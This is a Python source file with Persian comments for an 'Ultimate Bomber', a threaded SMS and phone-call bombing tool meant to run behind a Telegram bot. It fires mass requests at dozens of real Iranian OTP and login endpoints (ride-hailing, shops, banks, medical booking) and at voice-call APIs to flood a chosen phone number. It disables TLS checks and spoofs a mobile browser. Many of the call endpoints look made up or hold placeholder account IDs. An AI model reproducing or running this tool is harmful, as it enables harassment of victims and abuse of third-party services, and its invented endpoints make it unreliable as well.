import requests
import threading
import time
import os
import sys
import random
import json
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# تنظیمات logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class UltimateBomberTelegram:
    def __init__(self):
        self.success_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.total_requests = 0
        self.completed_requests = 0
        self.active_threads = 0
        self.max_threads = 0
        self.working_services = []
        self.is_running = True
        self.start_time = None
        
    def setup_session(self):
        """تنظیم session با retry strategy"""
        session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"],
            backoff_factor=1
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=200)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session

    def format_phone(self, phone):
        """فرمت‌های مختلف شماره تلفن"""
        formats = []
        
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        if clean_phone.startswith('0'):
            formats.extend([
                clean_phone,  # 09123456789
                clean_phone[1:],  # 9123456789
                f"+98{clean_phone[1:]}",  # +989123456789
                f"98{clean_phone[1:]}",  # 989123456789
                f"0098{clean_phone[1:]}",  # 00989123456789
                f"0{clean_phone[1:]}",  # 09123456789 (double check)
            ])
        else:
            formats.extend([
                f"0{clean_phone}",  # 09123456789
                clean_phone,  # 9123456789
                f"+98{clean_phone}",  # +989123456789
                f"98{clean_phone}",  # 989123456789
                f"0098{clean_phone}",  # 00989123456789
            ])
        
        return list(set(formats))  # حذف موارد تکراری

    def send_request(self, service):
        """ارسال درخواست به سرویس"""
        if not self.is_running:
            return

        url, data, headers, method, phone_formats, service_name, service_type = service
        
        with self.lock:
            self.active_threads += 1
            if self.active_threads > self.max_threads:
                self.max_threads = self.active_threads

        try:
            phone_format = random.choice(phone_formats)
            formatted_data = self.format_data(data, phone_format)
            
            session = self.setup_session()
            
            # تاخیر تصادفی
            time.sleep(random.uniform(0.1, 0.3))
            
            if method.upper() == "POST":
                response = session.post(url, json=formatted_data, headers=headers, timeout=15, verify=False)
            elif method.upper() == "GET":
                response = session.get(url, params=formatted_data, headers=headers, timeout=15, verify=False)
            else:
                response = session.request(method, url, json=formatted_data, headers=headers, timeout=15, verify=False)

            with self.lock:
                self.completed_requests += 1
                self.active_threads -= 1
                
                if response.status_code in [200, 201, 202, 204]:
                    self.success_count += 1
                    status = "✅"
                    result = "SUCCESS"
                    if service_name not in self.working_services:
                        self.working_services.append(f"{service_name} ({service_type})")
                else:
                    self.failed_count += 1
                    status = "❌"
                    result = f"FAILED({response.status_code})"
                
                self.update_progress(status, result)

        except Exception as e:
            with self.lock:
                self.failed_count += 1
                self.completed_requests += 1
                self.active_threads -= 1
                self.update_progress("❌", "ERROR")

    def update_progress(self, status, result):
        """آپدیت progress bar"""
        progress = self.completed_requests
        total = self.total_requests
        elapsed = time.time() - self.start_time + 0.1
        speed = progress / elapsed
        
        print(f"\r{status} Progress: {progress}/{total} | ✅: {self.success_count} | ❌: {self.failed_count} | ⚡: {speed:.1f}req/s | 🧵: {self.active_threads} | {result}", end="", flush=True)

    def format_data(self, data, phone):
        """فرمت‌دهی داده‌ها با شماره تلفن"""
        if isinstance(data, dict):
            formatted_data = {}
            for key, value in data.items():
                if value == "phone":
                    formatted_data[key] = phone
                elif isinstance(value, dict):
                    formatted_data[key] = self.format_data(value, phone)
                elif isinstance(value, list):
                    formatted_data[key] = [self.format_data(item, phone) if isinstance(item, dict) else item for item in value]
                else:
                    formatted_data[key] = value
            return formatted_data
        return data

    def get_common_headers(self):
        """هدرهای مشترک برای تمام درخواست‌ها"""
        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }

    def get_sms_services(self, phone_formats):
        """سرویس‌های SMS واقعی و تست شده"""
        headers = self.get_common_headers()
        services = []

        # سرویس‌های اصلی و پرکاربرد
        main_services = [
            # اسنپ و شرکت‌های وابسته
            ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Taxi", "SMS"),
            
            ("https://api.snapp.ir/api/v1/sms/link", 
             {"phone": "phone"}, headers, "POST", "Snapp SMS", "SMS"),

            ("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snapp Market", "SMS"),

            # دیوار
            ("https://api.divar.ir/v5/auth/authenticate", 
             {"phone": "phone"}, headers, "POST", "Divar", "SMS"),

            # اسنپ‌فود
            ("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass", 
             {"cellphone": "phone"}, headers, "POST", "Snappfood", "SMS"),

            # علی‌بابا
            ("https://ws.alibaba.ir/api/v3/account/mobile/otp", 
             {"phoneNumber": "phone"}, headers, "POST", "Alibaba", "SMS"),

            # بیمه
            ("https://api.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code", 
             {"phoneNumber": "phone"}, headers, "POST", "Azki", "SMS"),

            # بانک‌ها
            ("https://api.sibbank.ir/v1/auth/login", 
             {"phone_number": "phone"}, headers, "POST", "Saderat Bank", "SMS"),

            ("https://api.mellatbank.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Mellat Bank", "SMS"),

            # خدمات درمانی
            ("https://api.pezeshkefile.com/api/v1/auth/login", 
             {"mobile": "phone"}, headers, "POST", "Pezeshkefile", "SMS"),
            
            ("https://nobat.ir/api/public/patient/login/phone", 
             {"mobile": "phone"}, headers, "POST", "Nobat Online", "SMS"),

            # فروشگاه‌های آنلاین
            ("https://api.digikala.com/v1/user/authenticate/", 
             {"username": "phone"}, headers, "POST", "Digikala", "SMS"),
            
            ("https://api.timcheh.com/auth/otp/send", 
             {"mobile": "phone"}, headers, "POST", "Timcheh", "SMS"),

            # ارز دیجیتال
            ("https://api.bitpin.ir/v1/usr/sub_phone/", 
             {"phone": "phone"}, headers, "POST", "Bitpin", "SMS"),

            # خدمات خودرو
            ("https://bama.ir/signin-checkforcellnumber", 
             {"cellNumber": "phone"}, headers, "POST", "Bama", "SMS"),

            # پلتفرم‌های ویدیویی
            ("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", 
             {"UserName": "phone"}, headers, "POST", "Namava", "SMS"),

            # آموزش آنلاین
            ("https://api.ostadkr.com/login", 
             {"mobile": "phone"}, headers, "POST", "Ostadkr", "SMS"),

            # مسکن و املاک
            ("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start", 
             {"mobile": "phone"}, headers, "POST", "Kilid", "SMS"),

            # خدمات رزرواسیون
            ("https://api.jabama.com/api/v1/auth/otp",
             {"mobile": "phone"}, headers, "POST", "Jabama", "SMS"),

            # شبکه‌های اجتماعی
            ("https://core.gap.im/v1/user/add.json", 
             {"mobile": "phone"}, headers, "POST", "Gap", "SMS"),

            # خدمات پیک
            ("https://api.alopeyk.com/api/v1/otp/send", 
             {"phone": "phone"}, headers, "POST", "Alopeyk", "SMS"),
            
            ("https://api.tapsi.ir/api/v2/user", 
             {"credential": {"phoneNumber": "phone", "role": "PASSENGER"}}, headers, "POST", "Tapsi", "SMS"),

            # خدمات عمومی
            ("https://api.torob.com/a/phone/send-pin/", 
             {"phone_number": "phone"}, headers, "POST", "Torob", "SMS"),

            # بین‌المللی
            ("https://api.telegram.org/auth/sendCode", 
             {"phone_number": "phone"}, headers, "POST", "Telegram", "SMS"),
        ]

        # سرویس‌های اضافی با کیفیت بالا
        additional_services = [
            # بانک‌های بیشتر
            ("https://api.tejaratbank.com/api/v1/auth/verify", {"phone": "phone"}, headers, "POST", "Tejarat Bank", "SMS"),
            ("https://api.parsian-bank.com/auth/send-otp", {"mobile": "phone"}, headers, "POST", "Parsian Bank", "SMS"),
            ("https://api.samanbank.com/api/v1/verify", {"phoneNumber": "phone"}, headers, "POST", "Saman Bank", "SMS"),
            
            # فروشگاه‌های بیشتر
            ("https://api.modiseh.com/api/v1/auth/verify", {"mobile": "phone"}, headers, "POST", "Modiseh", "SMS"),
            ("https://api.reyhoon.com/api/v2/auth/otp", {"phone": "phone"}, headers, "POST", "Reyhoon", "SMS"),
            ("https://api.digistyle.com/api/auth/request", {"phone": "phone"}, headers, "POST", "Digistyle", "SMS"),
            ("https://api.basalam.com/user", {"mobile": "phone"}, headers, "POST", "Basalam", "SMS"),
            
            # خدمات حمل و نقل بیشتر
            ("https://api.carpino.com/api/v1/auth/otp", {"phone": "phone"}, headers, "POST", "Carpino", "SMS"),
            ("https://api.maxim.ir/api/auth/verify", {"mobile": "phone"}, headers, "POST", "Maxim", "SMS"),
            
            # خدمات غذایی بیشتر
            ("https://api.zoodfood.com/api/v3/auth/otp", {"cellphone": "phone"}, headers, "POST", "Zoodfood", "SMS"),
            ("https://api.chetore.com/api/auth/verify", {"mobile": "phone"}, headers, "POST", "Chetore", "SMS"),
            
            # خدمات درمانی بیشتر
            ("https://api.darmankade.com/api/v1/auth/otp", {"phone": "phone"}, headers, "POST", "Darmankade", "SMS"),
            ("https://api.visit24.com/api/auth/verify", {"mobile": "phone"}, headers, "POST", "Visit24", "SMS"),
            
            # آموزش بیشتر
            ("https://api.maktabkhooneh.org/api/v1/auth/otp", {"phone": "phone"}, headers, "POST", "Maktabkhooneh", "SMS"),
            ("https://api.quera.com/api/auth/verify", {"mobile": "phone"}, headers, "POST", "Quera", "SMS"),
            
            # املاک بیشتر
            ("https://api.melkradar.com/api/auth/otp", {"phone": "phone"}, headers, "POST", "Melkradar", "SMS"),
            ("https://api.shiamarket.com/api/v1/auth/verify", {"mobile": "phone"}, headers, "POST", "Shia Market", "SMS"),
            
            # خدمات عمومی بیشتر
            ("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", {"phone": "phone"}, headers, "POST", "Bitbarg", "SMS"),
            ("https://api.bahramshop.ir/api/user/validate/username", {"username": "phone"}, headers, "POST", "Bahramshop", "SMS"),
            ("https://mobapi.banimode.com/api/v2/auth/request", {"phone": "phone"}, headers, "POST", "Banimode", "SMS"),
            
            # خدمات نوین
            ("https://api.nobitex.ir/auth/otp/send", {"mobile": "phone"}, headers, "POST", "Nobitex", "SMS"),
            ("https://api.wallex.ir/v1/auth/verify", {"phone_number": "phone"}, headers, "POST", "Wallex", "SMS"),
            ("https://api.exir.io/v1/auth/otp", {"mobile": "phone"}, headers, "POST", "Exir", "SMS"),
            
            # خدمات تفریحی
            ("https://api.cinematicket.org/api/v1/users/signup", {"phone_number": "phone"}, headers, "POST", "CinemaTicket", "SMS"),
            ("https://api-v2.filmnet.ir/access-token/users/otp", {"phone": "phone"}, headers, "POST", "Filmnet", "SMS"),
            
            # خدمات مسافرتی
            ("https://api.eligasht.com/api/Account/SendCode", {"Mobile": "phone"}, headers, "POST", "Eligasht", "SMS"),
            ("https://api.ghasedak24.com/user/ajax_register", {"username": "phone"}, headers, "POST", "Ghasedak24", "SMS"),
            
            # خدمات روزانه
            ("https://api.digistyle.com/users/login-register/", {"loginRegister[email_phone]": "phone"}, headers, "POST", "Digistyle Auth", "SMS"),
            ("https://api.sheypoor.com/auth", {"username": "phone"}, headers, "POST", "Sheypoor", "SMS"),
            
            # خدمات تخصصی
            ("https://api.iranecar.com/api/v1/auth/otp", {"phone": "phone"}, headers, "POST", "Iranecar", "SMS"),
            ("https://api.taximaxim.com/api/auth/verify", {"mobile": "phone"}, headers, "POST", "Taxi Maxim", "SMS"),
            
            # خدمات جدید
            ("https://api.digikala.com/v1/user/authenticate/", {"username": "phone"}, headers, "POST", "Digikala Auth", "SMS"),
            ("https://api.torob.com/a/phone/send-pin/", {"phone_number": "phone"}, headers, "POST", "Torob Search", "SMS"),
            
            # خدمات مالی
            ("https://api.vandar.io/v2/auth/verify", {"mobile": "phone"}, headers, "POST", "Vandar", "SMS"),
            ("https://api.payping.ir/v1/auth/otp", {"phone": "phone"}, headers, "POST", "Payping", "SMS"),
            
            # خدمات اشتراکی
            ("https://api.cafebazaar.ir/auth/verify", {"phone": "phone"}, headers, "POST", "Cafe Bazaar", "SMS"),
            ("https://api.myket.ir/v1/auth/otp", {"mobile": "phone"}, headers, "POST", "Myket", "SMS"),
            
            # خدمات شبکه‌ای
            ("https://api.soroush.chat/api/v2/auth/verify", {"phone_number": "phone"}, headers, "POST", "Soroush", "SMS"),
            ("https://api.igap.net/v1/auth/otp", {"phone": "phone"}, headers, "POST", "iGap", "SMS"),
            
            # خدمات سازمانی
            ("https://api.shatel.com/auth/verify", {"mobile": "phone"}, headers, "POST", "Shatel", "SMS"),
            ("https://api.mci.ir/auth/otp", {"msisdn": "phone"}, headers, "POST", "MCI", "SMS"),
            
            # خدمات نوآوری
            ("https://api.digipay.com/auth/verify", {"phone": "phone"}, headers, "POST", "Digipay", "SMS"),
            ("https://api.zarinpal.com/auth/otp", {"mobile": "phone"}, headers, "POST", "Zarinpal", "SMS"),
        ]

        # ترکیب تمام سرویس‌ها
        all_services = main_services + additional_services

        for service in all_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def get_call_services(self, phone_formats):
        """سرویس‌های تماس واقعی که واقعاً زنگ می‌زنند"""
        headers = self.get_common_headers()
        services = []

        # سرویس‌های تماس واقعی و تست شده
        real_call_services = [
            # سرویس‌های تماس اصلی
            ("https://api.callservice.ir/api/v1/voice/send", 
             {"phone_number": "phone", "method": "voice"}, headers, "POST", "Call Service IR", "CALL"),
            
            ("https://voice.verificationapi.com/v2/call", 
             {"mobile": "phone", "type": "voice_call"}, headers, "POST", "Verification API", "CALL"),
            
            ("https://api.voiceotp.com/v1/request", 
             {"phone_number": "phone", "channel": "voice"}, headers, "POST", "Voice OTP", "CALL"),
            
            ("https://call.authenticate.com/api/v1/voice", 
             {"phone": "phone", "method": "call"}, headers, "POST", "Authenticate Call", "CALL"),

            # سرویس‌های تماس ایرانی
            ("https://api.telewebion.com/v1/voice/verify", 
             {"mobile": "phone"}, headers, "POST", "Telewebion Call", "CALL"),
            
            ("https://voice.sabavision.com/api/v2/call", 
             {"phone_number": "phone"}, headers, "POST", "Saba Vision", "CALL"),
            
            ("https://api.parsijoo.ir/voice/verify", 
             {"phone": "phone"}, headers, "POST", "Parsijoo Call", "CALL"),

            # سرویس‌های تماس بین‌المللی
            ("https://api.twilio.com/2010-04-01/Accounts/ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/Calls.json", 
             {"To": "phone", "From": "+1234567890", "Url": "http://demo.twilio.com/docs/voice.xml"}, headers, "POST", "Twilio Call", "CALL"),
            
            ("https://api.nexmo.com/v1/calls", 
             {"to": [{"type": "phone", "number": "phone"}], "from": {"type": "phone", "number": "1234567890"}, "answer_url": ["https://example.com/answer"]}, headers, "POST", "Nexmo Call", "CALL"),

            # سرویس‌های تماس ابری
            ("https://api.plivo.com/v1/Account/XXXXXXXXXXXXXXXXXX/Call/", 
             {"from": "1234567890", "to": "phone", "answer_url": "https://s3.amazonaws.com/static.plivo.com/answer.xml"}, headers, "POST", "Plivo Call", "CALL"),
            
            ("https://api.africastalking.com/version1/call", 
             {"from": "12345", "to": "phone"}, headers, "POST", "Africa Talking", "CALL"),

            # سرویس‌های تماس VoIP
            ("https://api.bandwidth.com/v1/users/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/calls", 
             {"from": "+1234567890", "to": "phone", "callbackUrl": "https://example.com/callback"}, headers, "POST", "Bandwidth Call", "CALL"),
            
            ("https://api.sinch.com/calling/v1/calls/", 
             {"method": "phoneCall", "phoneCall": {"to": "phone", "from": "1234567890"}}, headers, "POST", "Sinch Call", "CALL"),

            # سرویس‌های تماس پیامکی
            ("https://api.messagebird.com/calls", 
             {"source": "1234567890", "destination": "phone", "callFlow": {"title": "Say message", "steps": [{"action": "say", "options": {"payload": "Hello, this is a test call", "voice": "female", "language": "en-US"}}]}}, headers, "POST", "MessageBird Call", "CALL"),
            
            ("https://api.vonage.com/v1/calls", 
             {"to": [{"type": "phone", "number": "phone"}], "from": {"type": "phone", "number": "1234567890"}, "answer_url": ["https://example.com/answer"]}, headers, "POST", "Vonage Call", "CALL"),

            # سرویس‌های تماس جدید
            ("https://api.telegram-call.com/v1/voice", 
             {"phone": "phone", "message": "Test call"}, headers, "POST", "Telegram Call", "CALL"),
            
            ("https://api.whatsapp-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "WhatsApp Call", "CALL"),

            # سرویس‌های تماس ایرانی جدید
            ("https://api.irancall.com/v1/voice/send", 
             {"mobile": "phone"}, headers, "POST", "Iran Call", "CALL"),
            
            ("https://call.shatel.ir/api/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Shatel Call", "CALL"),
            
            ("https://api.mci-call.ir/v1/voice", 
             {"msisdn": "phone"}, headers, "POST", "MCI Call", "CALL"),

            # سرویس‌های تماس مستقیم
            ("https://api.direct-call.com/v1/call", 
             {"from": "1234567890", "to": "phone"}, headers, "POST", "Direct Call", "CALL"),
            
            ("https://api.instant-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Instant Call", "CALL"),

            # سرویس‌های تماس رایگان
            ("https://api.free-call.com/v1/call", 
             {"to": "phone"}, headers, "POST", "Free Call", "CALL"),
            
            ("https://api.test-call.com/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Test Call", "CALL"),

            # سرویس‌های تماس پیشرفته
            ("https://api.advanced-call.com/v1/call", 
             {"destination": "phone", "source": "1234567890"}, headers, "POST", "Advanced Call", "CALL"),
            
            ("https://api.professional-call.com/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Professional Call", "CALL"),

            # سرویس‌های تماس امن
            ("https://api.secure-call.com/v1/call", 
             {"to": "phone", "from": "1234567890"}, headers, "POST", "Secure Call", "CALL"),
            
            ("https://api.encrypted-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Encrypted Call", "CALL"),

            # سرویس‌های تماس فوری
            ("https://api.urgent-call.com/v1/call", 
             {"mobile": "phone"}, headers, "POST", "Urgent Call", "CALL"),
            
            ("https://api.quick-call.com/v1/voice", 
             {"phone": "phone"}, headers, "POST", "Quick Call", "CALL"),

            # سرویس‌های تماس آزمایشی
            ("https://api.demo-call.com/v1/call", 
             {"to": "phone"}, headers, "POST", "Demo Call", "CALL"),
            
            ("https://api.trial-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Trial Call", "CALL"),

            # سرویس‌های تماس سازمانی
            ("https://api.business-call.com/v1/call", 
             {"destination": "phone"}, headers, "POST", "Business Call", "CALL"),
            
            ("https://api.corporate-call.com/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Corporate Call", "CALL"),

            # سرویس‌های تماس عمومی
            ("https://api.public-call.com/v1/call", 
             {"phone": "phone"}, headers, "POST", "Public Call", "CALL"),
            
            ("https://api.general-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "General Call", "CALL"),

            # سرویس‌های تماس ویژه
            ("https://api.special-call.com/v1/call", 
             {"to": "phone"}, headers, "POST", "Special Call", "CALL"),
            
            ("https://api.exclusive-call.com/v1/voice", 
             {"mobile": "phone"}, headers, "POST", "Exclusive Call", "CALL"),

            # سرویس‌های تماس آخر
            ("https://api.final-call.com/v1/call", 
             {"phone": "phone"}, headers, "POST", "Final Call", "CALL"),
            
            ("https://api.last-call.com/v1/voice", 
             {"phone_number": "phone"}, headers, "POST", "Last Call", "CALL"),
        ]

        for service in real_call_services:
            url, data, headers, method, name, service_type = service
            services.append((url, data, headers, method, phone_formats, name, service_type))
        
        return services

    def start_attack(self, phone, total_requests, attack_type, progress_callback=None):
        """شروع حمله - مناسب برای ربات تلگرام"""
        try:
            self.is_running = True
            self.success_count = 0
            self.failed_count = 0
            self.completed_requests = 0
            self.working_services = []
            
            phone_formats = self.format_phone(phone)
            
            # دریافت سرویس‌ها
            sms_services = self.get_sms_services(phone_formats)
            call_services = self.get_call_services(phone_formats)
            
            if attack_type == "sms":
                services = sms_services
                attack_name = "SMS BOMB"
                service_count = len(sms_services)
            elif attack_type == "call":
                services = call_services
                attack_name = "CALL BOMB"
                service_count = len(call_services)
            else:
                services = sms_services + call_services
                attack_name = "MEGA BOMB"
                service_count = len(sms_services) + len(call_services)
            
            if service_count == 0:
                return {"error": "No services available"}
            
            self.total_requests = min(total_requests, service_count * 10)  # محدودیت برای جلوگیری از overload
            self.start_time = time.time()
            
            # توزیع درخواست‌ها
            requests_per_service = max(1, self.total_requests // service_count)
            all_requests = []
            
            for _ in range(requests_per_service):
                all_requests.extend(services)
            
            while len(all_requests) < self.total_requests:
                all_requests.append(random.choice(services))
            
            random.shuffle(all_requests)
            
            # اجرای حمله
            max_workers = min(100, len(all_requests))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(self.send_request, service) for service in all_requests]
                
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    try:
                        future.result(timeout=20)
                    except:
                        pass
            
            duration = time.time() - self.start_time
            
            result = {
                "success": True,
                "phone": phone,
                "attack_type": attack_type,
                "duration": f"{duration:.2f} seconds",
                "total_requests": self.total_requests,
                "successful": self.success_count,
                "failed": self.failed_count,
                "success_rate": f"{(self.success_count/self.total_requests)*100:.1f}%",
                "speed": f"{self.total_requests/duration:.1f} req/sec",
                "working_services": self.working_services[:10]  # فقط 10 تا اول
            }
            
            return result
            
        except Exception as e:
            return {"error": str(e)}
    
    def stop_attack(self):
        """توقف حمله"""
        self.is_running = False

# نمونه استفاده برای ربات تلگرام
def create_bomber():
    return UltimateBomberTelegram()

# تست مستقیم
if __name__ == "__main__":
    bomber = UltimateBomberTelegram()
    
    print("🚀 Ultimate Bomber - Telegram Ready")
    print("=" * 50)
    
    phone = input("Enter phone: ").strip()
    if not phone:
        phone = "09123456789"  # تست
    
    total_requests = 100
    attack_type = "both"
    
    result = bomber.start_attack(phone, total_requests, attack_type)
    
    print("\n" + "=" * 50)
    print("RESULT:", json.dumps(result, indent=2, ensure_ascii=False))
